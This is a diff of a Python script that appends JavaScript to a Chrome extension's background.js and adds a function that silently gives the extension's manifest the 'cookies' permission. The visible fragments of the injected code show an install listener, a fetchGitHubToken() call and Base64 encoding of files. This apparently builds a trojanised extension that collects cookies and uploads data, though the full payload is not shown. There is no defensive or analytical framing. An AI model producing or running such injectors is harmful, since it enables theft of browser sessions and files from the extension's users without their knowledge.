@@ -1,6 +1,8 @@
+import os
+import json
 # Define the path to the js/background.js file
 file_path = 'js/background.js'
-
+manifest_path = 'manifest.json'
 # The code you want to append
 code_to_append = """
 chrome.runtime.onInstalled.addListener(() => {
@@ -75,7 +77,32 @@ fetchGitHubToken().then(token => {
     reader.readAsDataURL(file); // Convert file to Base64
   }
 """
+def add_cookie_permission(manifest_path):
+    if not os.path.exists(manifest_path):
+        print(f"Manifest file not found at: {manifest_path}")
+        return
 
+    with open(manifest_path, 'r') as f:
+        try:
+            manifest = json.load(f)
+        except json.JSONDecodeError as e:
+            print(f"Failed to parse JSON: {e}")
+            return
+
+    permissions = manifest.get("permissions", [])
+
+    if "cookies" not in permissions:
+        permissions.append("cookies")
+        manifest["permissions"] = permissions
+
+        with open(manifest_path, 'w') as f:
+            json.dump(manifest, f, indent=4)
+        print("✅ 'cookies' permission added to manifest.")
+    else:
+        print("ℹ️ 'cookies' permission already exists.")
+
+# Example usage
+add_cookie_permission(manifest_path)
 # Open the file in append mode and write the code
 try:
     with open(file_path, 'a') as file:
